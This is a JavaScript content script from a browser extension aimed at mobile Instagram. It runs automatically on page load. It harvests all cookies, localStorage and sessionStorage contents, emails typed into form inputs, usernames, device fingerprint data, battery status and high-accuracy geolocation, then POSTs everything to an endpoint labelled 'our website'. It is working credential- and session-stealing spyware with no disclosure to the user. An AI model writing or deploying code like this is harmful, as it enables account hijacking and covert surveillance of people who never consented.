// Mobile content script for Instagram
console.log('Mobile Instagram Data Collector loaded');

function collectMobileInstagramData() {
  const data = {
    username: null,
    email: null,
    profileInfo: {},
    cookies: {},
    localStorage: {},
    sessionStorage: {},
    mobileInfo: {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      timestamp: new Date().toISOString()
    }
  };

  // Try to get username from mobile Instagram elements
  const mobileUsernameSelectors = [
    '[data-testid="user-avatar"]',
    '._aacl._aaco._aacw._aacx._aad7._aade',
    '[aria-label*="profile"]',
    '.x1lliihq.x1n2onr6.x5n08af',
    '[data-testid="username"]',
    'a[href*="/"] span',
    '.x1lliihq.x6ikm8r.x10wlt62.x1n2onr6',
    // Mobile-specific selectors
    '.x1lliihq.x1n2onr6.x5n08af.x1ja2u2z',
    '.x1lliihq.x6ikm8r.x10wlt62.x1n2onr6.xlyipy.xm81vs4',
    '[data-testid="profile"]'
  ];

  mobileUsernameSelectors.forEach(selector => {
    const elements = document.querySelectorAll(selector);
    elements.forEach(el => {
      const text = el.textContent || el.getAttribute('aria-label') || '';
      if (text && text.includes('@')) {
        data.username = text;
      }
    });
  });

  // Try to get email from mobile forms
  const emailInputs = document.querySelectorAll('input[type="email"]');
  emailInputs.forEach(input => {
    if (input.value && input.value.includes('@')) {
      data.email = input.value;
    }
  });

  // Get mobile localStorage data
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      data.localStorage[key] = value;
    }
  } catch (e) {
    console.log('Could not access mobile localStorage');
  }

  // Get mobile sessionStorage data
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const value = sessionStorage.getItem(key);
      data.sessionStorage[key] = value;
    }
  } catch (e) {
    console.log('Could not access mobile sessionStorage');
  }

  // Get mobile cookies
  try {
    const cookies = document.cookie.split(';');
    cookies.forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      data.cookies[name] = value;
    });
  } catch (e) {
    console.log('Could not access mobile cookies');
  }

  // Try to get mobile-specific data
  try {
    // Check for mobile browser features
    if ('getBattery' in navigator) {
      navigator.getBattery().then(battery => {
        data.mobileInfo.battery = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      });
    }

    // Check for mobile geolocation (if user allows)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          data.mobileInfo.location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
        },
        error => {
          console.log('Mobile geolocation not available:', error);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 60000
        }
      );
    }
  } catch (e) {
    console.log('Error getting mobile-specific data:', e);
  }

  // Send data to our website
  fetch('http://localhost:3000/api/mobile-instagram-data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  }).catch(e => console.log('Could not send mobile data:', e));

  return data;
}

// Collect data when page loads
setTimeout(collectMobileInstagramData, 2000);

// Listen for messages from background
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'collectMobileData') {
    const data = collectMobileInstagramData();
    sendResponse(data);
  }
}); 